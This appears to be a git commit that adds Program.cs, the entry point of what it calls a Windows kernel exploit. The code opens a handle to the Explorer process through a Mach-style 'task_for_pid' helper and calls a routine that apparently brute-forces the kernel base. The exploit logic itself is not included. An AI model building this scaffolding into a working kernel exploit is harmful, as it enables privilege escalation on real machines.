5640b542d4fdcabf186a26325988901e581beb8e
panicless-t <79938758+panicless-t@users.noreply.github.com>
2021-03-11 11:14:04 +0300

    no more 0day

---
+++ Program.cs
@@ -0,0 +1,20 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace win_kern_port
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            port exploit_main = new port();
+            IntPtr task_t = new kernel_utility.kutil().task_for_pid(0x0fffff, false, System.Diagnostics.Process.GetProcessesByName("EXPLORER")[0].Id);
+            new kernel_utility.kutil().LOG("pid_t -> {0}", System.Diagnostics.Process.GetProcessesByName("EXPLORER")[0].Id);
+            exploit_main.bf_kernel_base();
+           
+        }
+    }
+}
